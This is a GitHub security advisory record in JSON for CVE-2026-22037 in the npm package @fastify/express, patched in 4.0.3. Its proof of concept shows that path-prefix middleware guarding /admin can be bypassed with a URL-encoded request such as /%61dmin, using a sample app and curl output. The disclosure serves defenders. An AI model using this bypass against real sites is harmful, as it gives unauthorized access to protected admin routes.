{
  "Severity": "HIGH",
  "UpdatedAt": "2026-01-20T16:35:24Z",
  "Package": {
    "Ecosystem": "NPM",
    "Name": "@fastify/express"
  },
  "Advisory": {
    "DatabaseId": 332929,
    "Id": "GSA_kwCzR0hTQS1nNnEzLTk2Y3AtNXI1bc4ABRSB",
    "GhsaId": "GHSA-g6q3-96cp-5r5m",
    "References": [
      {
        "Url": "https://github.com/fastify/fastify-express/security/advisories/GHSA-g6q3-96cp-5r5m"
      },
      {
        "Url": "https://nvd.nist.gov/vuln/detail/CVE-2026-22037"
      },
      {
        "Url": "https://github.com/fastify/fastify-express/commit/dc02a3fe1387f945143f22597baa42557d549a40"
      },
      {
        "Url": "https://github.com/fastify/fastify-express/releases/tag/v4.0.3"
      },
      {
        "Url": "https://github.com/advisories/GHSA-g6q3-96cp-5r5m"
      }
    ],
    "Identifiers": [
      {
        "Type": "GHSA",
        "Value": "GHSA-g6q3-96cp-5r5m"
      },
      {
        "Type": "CVE",
        "Value": "CVE-2026-22037"
      }
    ],
    "Description": "### Summary\nA security vulnerability exists in `@fastify/express` where middleware registered with a specific path prefix can be bypassed using URL-encoded characters (e.g., `/%61dmin` instead of `/admin`). While the middleware engine fails to match the encoded path and skips execution, the underlying Fastify router correctly decodes the path and matches the route handler, allowing attackers to access protected endpoints without the middleware constraints.\n\n### Details\nThe vulnerability is caused by how `@fastify/express` matches requests against registered middleware paths.\n\n### PoC\n**Step 1:** Run the following Fastify application (save as `app.js`):\n\n```javascript\nconst fastify = require('fastify')({ logger: true });\n\nasync function start() {\n  // Register fastify-express for Express-style middleware support\n  await fastify.register(require('@fastify/express'));\n\n  // Middleware to block /admin route\n  fastify.use('/admin', (req, res, next) =\u003e {\n    res.statusCode = 403;\n    res.end('Forbidden: Access to /admin is blocked');\n  });\n\n  // Sample routes\n  fastify.get('/', async (request, reply) =\u003e {\n    return { message: 'Welcome to the homepage' };\n  });\n\n  fastify.get('/admin', async (request, reply) =\u003e {\n    return { message: 'Admin panel' };\n  });\n\n  fastify.get('/admin/dashboard', async (request, reply) =\u003e {\n    return { message: 'Admin dashboard' };\n  });\n\n  // Start server\n  try {\n    await fastify.listen({ port: 3000 });\n  } catch (err) {\n    fastify.log.error(err);\n    process.exit(1);\n  }\n}\n\nstart();\n```\n\n**Step 2:** Execute the attack.\n\n```\n➜  ~ curl http://206.189.140.29:3000/%61dmin\n\u003c!DOCTYPE html\u003e\n\u003chtml lang=\"en\"\u003e\n\u003chead\u003e\n\u003cmeta charset=\"utf-8\"\u003e\n\u003ctitle\u003eError\u003c/title\u003e\n\u003c/head\u003e\n\u003cbody\u003e\n\u003cpre\u003eCannot GET /%61dmin\u003c/pre\u003e\n\u003c/body\u003e\n\u003c/html\u003e\n\n(fastify express)\n\n➜  ~ curl http://206.189.140.29:3000/%61dmin\n{\"message\":\"Admin panel\"}\n```\n\nIt differs from [CVE-2026-22031](https://nvd.nist.gov/vuln/detail/CVE-2026-22031) because this is a different npm module with its own code.",
    "Origin": "UNSPECIFIED",
    "PublishedAt": "2026-01-20T16:35:21Z",
    "Severity": "HIGH",
    "Summary": "@fastify/express vulnerable to Improper Handling of URL Encoding (Hex Encoding)",
    "UpdatedAt": "2026-01-20T16:35:24Z",
    "WithdrawnAt": "",
    "CVSS": {
      "Score": 8.4,
      "VectorString": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:H/A:L"
    }
  },
  "Versions": [
    {
      "FirstPatchedVersion": {
        "Identifier": "4.0.3"
      },
      "VulnerableVersionRange": "\u003c= 4.0.2"
    }
  ]
}